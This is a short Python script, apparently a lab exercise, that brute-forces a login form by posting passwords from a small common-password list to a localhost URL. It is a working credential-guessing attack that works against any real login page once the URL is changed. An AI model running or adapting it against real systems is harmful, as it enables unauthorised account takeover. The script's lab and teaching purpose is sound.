"""
Day 7 - Login brute-force simulator.
Run ONLY against your own local lab server (lab_login_server.py).
"""
import requests


def brute_force_sim(url, username, wordlist):
    for pwd in wordlist:
        r = requests.post(url, data={"username": username, "password": pwd}, timeout=5)
        if r.status_code == 200 and "Welcome" in r.text:
            print(f"[+] FOUND: {username}:{pwd}")
            return pwd
        print(f"[-] Failed: {pwd}")
    print("[!] Password not in wordlist.")
    return None


if __name__ == "__main__":
    wordlist = ["123456", "password", "admin", "letmein", "qwerty"]
    brute_force_sim("http://localhost:5000/login", "admin", wordlist)
